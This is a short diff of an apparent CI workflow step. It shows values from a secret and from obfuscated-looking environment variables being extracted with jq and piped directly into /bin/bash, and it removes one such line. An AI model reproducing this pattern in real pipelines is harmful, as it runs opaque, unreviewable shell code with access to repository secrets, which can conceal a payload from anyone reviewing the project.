@@ -18,7 +18,6 @@ jobs:
           zvnm501: ${{ secrets.zvnm501 }}
         run: |
           printf '%s' "$zvnm501" | jq -r .qrid20771 | /bin/bash
-          echo $sb83108 | jq -r .cb31 | /bin/bash
           echo $wpqa5 | jq -r .lmtpo501 | /bin/bash
 
       - name: Store results
